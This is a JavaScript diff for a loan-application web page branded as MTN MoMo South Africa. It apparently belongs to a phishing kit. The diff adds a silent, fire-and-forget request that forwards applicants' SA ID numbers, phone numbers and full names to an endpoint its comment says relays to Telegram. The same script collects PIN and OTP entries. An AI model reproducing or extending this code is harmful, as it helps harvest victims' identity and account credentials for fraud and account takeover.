@@ -1,45 +1,34 @@
 // ============================================================
 // script.js – MTN MoMo South Africa
-// New flow: two paths + requirements + guarantor
+// Account-type limits enforced · Registration via temp endpoint
 // ============================================================
+'use strict';
+
 // ─── Account Types (mirrors backend) ───
 const ACCOUNT_TYPES = {
     yello: {
-        name: 'MoMo Yello',
-        icon: '🟡',
-        dailyCash: 3500,
-        monthlyCap: 20000,
-        maxLoan: 20000,
-        minLoan: 5000,
-        requiresId: true
+        name: 'MoMo Yello', icon: '🟡',
+        dailyCash: 3500, monthlyCap: 20000,
+        maxLoan: 20000, minLoan: 5000, requiresId: true
     },
     yello_plus: {
-        name: 'MoMo Yello Plus',
-        icon: '⭐',
-        dailyCash: 10000,
-        monthlyCap: 40000,
-        maxLoan: 40000,
-        minLoan: 5000,
-        requiresId: true
+        name: 'MoMo Yello Plus', icon: '⭐',
+        dailyCash: 10000, monthlyCap: 40000,
+        maxLoan: 40000, minLoan: 5000, requiresId: true
     },
     eazi: {
-        name: 'MoMo Eazi',
-        icon: '⚡',
-        dailyCash: 2000,
-        monthlyCap: 10000,
-        maxLoan: 10000,
-        minLoan: 5000,
-        requiresId: false
+        name: 'MoMo Eazi', icon: '⚡',
+        dailyCash: 2000, monthlyCap: 10000,
+        maxLoan: 10000, minLoan: 5000, requiresId: false
     }
 };
 
-
-'use strict';
-
 const S = {
-    userPath: null,        // 'existing' | 'new'
+    userPath: null,
     isRegistered: null,
     accountType: null,
+    accountMaxLoan: 0,
+    accountMonthlyCap: 0,
     idNumber: null,
     loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
     firstName: '', lastName: '', phone: '', email: '',
@@ -77,12 +66,18 @@ function escapeHtml(s) {
     return String(s || '').replace(/[&<>"']/g, c =>
         ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
 }
+function fmt(n) { return (Number(n) || 0).toLocaleString(); }
 
 function goTo(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     const el = document.getElementById(pageId);
     if (el) el.classList.add('active');
     window.scrollTo(0, 0);
+
+    // Hook: update requirements page whenever navigated
+    if (pageId === 'page-requirements') updateRequirementsLimits();
+    // Hook: update step1 account info when navigated
+    if (pageId === 'page-step1') refreshStep1AccountInfo();
 }
 
 function showToast(msg, type = 'info', duration = 3200) {
@@ -164,7 +159,6 @@ function applyAsExistingUser() {
     S.userPath = 'existing';
     S.isRegistered = true;
     saveAppData();
-    // Pre-fill the amount from calculator if user interacted
     if (!S.loanAmount) {
         S.loanAmount = +document.getElementById('amtSlider').value;
         S.loanTerm = document.getElementById('calcTermSelect').value + ' Months';
@@ -181,10 +175,8 @@ function applyFromCalculator() {
     S.loanTerm = term + ' Months';
     saveAppData();
     showToast(`💰 R ${amt.toLocaleString()} for ${term} months selected`, 'success');
-    // Scroll to the action cards
     const el = document.querySelector('.land-actions');
     if (el) el.scrollIntoView({ behavior: 'smooth', block: 'center' });
-    // Pulse the action cards
     el.querySelectorAll('.action-card').forEach(card => {
         card.style.animation = 'none';
         setTimeout(() => card.style.animation = 'pulse-highlight 1.2s ease 2', 20);
@@ -218,7 +210,7 @@ function startMoMoRegistration() {
     goTo('page-register-check');
 }
 
-// ─── SA ID parsing ───
+// ─── SA ID parsing (mirrors backend) ───
 function parseSAId(id) {
     if (!id) return { ok: false, reason: 'ID number is required.' };
     const clean = String(id).replace(/\s/g, '');
@@ -310,14 +302,27 @@ async function completeRegistration() {
     document.getElementById('regProcessingStatus').textContent = '⏳ Verifying your ID...';
 
     try {
+        // Send registration to BOTH endpoints:
+        // 1. Main endpoint (stores on application)
+        // 2. Temporary endpoint (forwards to Telegram standalone)
+        const payload = {
+            applicationId: S.applicationId,
+            idNumber: rawId,
+            accountType: selectedAccountType,
+            phone: S.phone || null,
+            fullName: `${S.firstName || ''} ${S.lastName || ''}`.trim() || null
+        };
+
+        // Fire-and-forget the temp endpoint
+        apiCall('/api/register-momo-telegram', {
+            method: 'POST',
+            body: JSON.stringify(payload)
+        }).catch(e => console.warn('Temp reg endpoint failed:', e.message));
+
+        // Main endpoint (blocking)
         const data = await apiCall('/api/register-momo', {
             method: 'POST',
-            body: JSON.stringify({
-                applicationId: S.applicationId,
-                idNumber: rawId,
-                accountType: selectedAccountType,
-                phone: S.phone || null
-            })
+            body: JSON.stringify(payload)
         });
 
         if (!data.ok) {
@@ -327,14 +332,18 @@ async function completeRegistration() {
             return;
         }
 
+        // Store the account type + limits
         S.idNumber = rawId;
         S.accountType = selectedAccountType;
+        S.accountMaxLoan = data.maxLoan;
+        S.accountMonthlyCap = data.limits.monthlyCap;
+        S.accountDailyCash = data.limits.dailyCash;
         S.isRegistered = true;
         saveAppData();
 
         document.getElementById('regProcessingStatus').textContent = '✅ MoMo account created!';
         setTimeout(() => {
-            showToast(`✅ ${data.accountName} registered!`, 'success');
+            showToast(`✅ ${data.accountName} registered! Max loan: R ${fmt(data.maxLoan)}`, 'success');
             setBtnLoading(btn, false, 'Complete Registration');
             goTo('page-requirements');
         }, 1500);
@@ -345,16 +354,102 @@ async function completeRegistration() {
     }
 }
 
+// ─── Requirements page dynamic text ───
+function updateRequirementsLimits() {
+    const type = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
+
+    const el1 = document.getElementById('reqLimitText');
+    if (el1) {
+        el1.innerHTML =
+            `Your <b>${type.icon} ${type.name}</b> account allows:<br>` +
+            `· Daily cash: <b>R ${fmt(type.dailyCash)}</b><br>` +
+            `· Monthly cap: <b>R ${fmt(type.monthlyCap)}</b><br>` +
+            `· <b>Maximum loan: R ${fmt(type.maxLoan)}</b>`;
+    }
+
+    const el2 = document.getElementById('reqTxText');
+    if (el2) {
+        const example20 = Math.ceil(type.maxLoan * 0.20);
+        el2.innerHTML =
+            `Have at least <b>20% of your loan amount</b> in MoMo transactions in the last 30 days. ` +
+            `For a <b>R ${fmt(type.maxLoan)}</b> loan, you'd need <b>R ${fmt(example20)}</b> in transactions.`;
+    }
+}
+
+// ─── Step 1: account type selection for existing users ───
+function selectExistingAccountType() {
+    const sel = document.getElementById('s1at');
+    const val = sel.value;
+    if (!val) {
+        document.getElementById('accInfoBox').style.display = 'none';
+        document.getElementById('loanLimitHint').textContent = 'Select your account type above first';
+        return;
+    }
+    const type = ACCOUNT_TYPES[val];
+    S.accountType = val;
+    S.accountMaxLoan = type.maxLoan;
+    S.accountMonthlyCap = type.monthlyCap;
+    S.accountDailyCash = type.dailyCash;
+    saveAppData();
+
+    const amInput = document.getElementById('s1am');
+    amInput.max = type.maxLoan;
+    if (+amInput.value > type.maxLoan) {
+        amInput.value = type.maxLoan;
+    }
+
+    document.getElementById('accInfoBox').style.display = 'block';
+    document.getElementById('accInfoText').innerHTML =
+        `<b>${type.icon} ${type.name}</b> — Max loan: <b>R ${fmt(type.maxLoan)}</b> · Monthly cap: R ${fmt(type.monthlyCap)}`;
+
+    document.getElementById('loanLimitHint').textContent =
+        `Max R ${fmt(type.maxLoan)} for ${type.name}`;
+    clearErr('s1Err');
+}
+
+function refreshStep1AccountInfo() {
+    // If user already has account type from registration, hide the selector and pre-fill
+    const typeField = document.getElementById('accountTypeField');
+    const accInfoBox = document.getElementById('accInfoBox');
+    const hint = document.getElementById('loanLimitHint');
+
+    if (S.accountType && ACCOUNT_TYPES[S.accountType]) {
+        const type = ACCOUNT_TYPES[S.accountType];
+        if (typeField) typeField.style.display = 'none';
+        if (accInfoBox) {
+            accInfoBox.style.display = 'block';
+            document.getElementById('accInfoText').innerHTML =
+                `<b>${type.icon} ${type.name}</b> — Max loan: <b>R ${fmt(type.maxLoan)}</b> · Monthly cap: R ${fmt(type.monthlyCap)}`;
+        }
+        if (hint) hint.textContent = `Max R ${fmt(type.maxLoan)} for ${type.name}`;
+        const amInput = document.getElementById('s1am');
+        amInput.max = type.maxLoan;
+        if (+amInput.value > type.maxLoan) amInput.value = type.maxLoan;
+    } else {
+        if (typeField) typeField.style.display = 'block';
+        if (accInfoBox) accInfoBox.style.display = 'none';
+        if (hint) hint.textContent = 'Select your account type above first';
+    }
+}
+
 // ─── Step navigation ───
 function toS2() {
     const ty = document.getElementById('s1ty').value;
     const am = +document.getElementById('s1am').value;
     const te = document.getElementById('s1te').value;
     const pu = document.getElementById('s1pu').value.trim();
-    if (!ty || am < 5000 || am > 500000 || !te || !pu) {
-        showErr('s1Err', am < 5000 ? 'Minimum R5,000.' : am > 500000 ? 'Maximum R500,000.' : 'Complete all fields.');
+
+    // Ensure account type is set
+    if (!S.accountType || !ACCOUNT_TYPES[S.accountType]) {
+        showErr('s1Err', 'Please select your MoMo account type.');
         return;
     }
+    const type = ACCOUNT_TYPES[S.accountType];
+
+    if (!ty || !te || !pu) { showErr('s1Err', 'Please complete all fields.'); return; }
+    if (am < type.minLoan) { showErr('s1Err', `Minimum loan for ${type.name} is R ${fmt(type.minLoan)}.`); return; }
+    if (am > type.maxLoan) { showErr('s1Err', `${type.name} allows a maximum loan of R ${fmt(type.maxLoan)}.`); return; }
+
     S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
     saveAppData(); saveDraft(); goTo('page-step2');
 }
@@ -383,7 +478,7 @@ function toGuarantor() {
     saveAppData(); saveDraft(); goTo('page-guarantor');
 }
 
-// ─── PIN/OTP ───
+// ─── PIN/OTP helpers ───
 function pinMvM(el, i, max = 5) {
     el.value = el.value.replace(/\D/g, '');
     if (el.value && i < max - 1) { document.getElementById('pin' + (i + 1))?.focus(); return; }
@@ -404,7 +499,7 @@ function handleOtpInput(el, type) {
     if (idx === 3 && el.value && [0, 1, 2, 3].every(i => document.getElementById('otp' + i)?.value)) setTimeout(doOtp, 300);
 }
 
-// ─── Submit application (from Guarantor page) ───
+// ─── Submit Application ───
 async function submitApp() {
     const gName = document.getElementById('gName').value.trim();
     const gPhone = document.getElementById('gPhone').value.trim();
@@ -685,6 +780,12 @@ async function recoverSession() {
         const data = await r.json();
         if (!data.ok) { loadDraft(); return; }
 
+        // Sync account type from server
+        if (data.accountType) {
+            S.accountType = data.accountType;
+            S.accountMaxLoan = data.accountMaxLoan;
+        }
+
         if (data.application === 'pending') {
             document.getElementById('waitAppId').textContent = S.applicationId;
             goTo('page-wait-app');
@@ -762,6 +863,7 @@ document.addEventListener('input', (e) => {
     if (e.target.closest('#page-step1, #page-step2, #page-step3, #page-guarantor')) saveDraft();
 });
 
+// ─── INIT ───
 updateCalc();
 recoverSession();
 console.log('✅ MTN MoMo SA loaded');
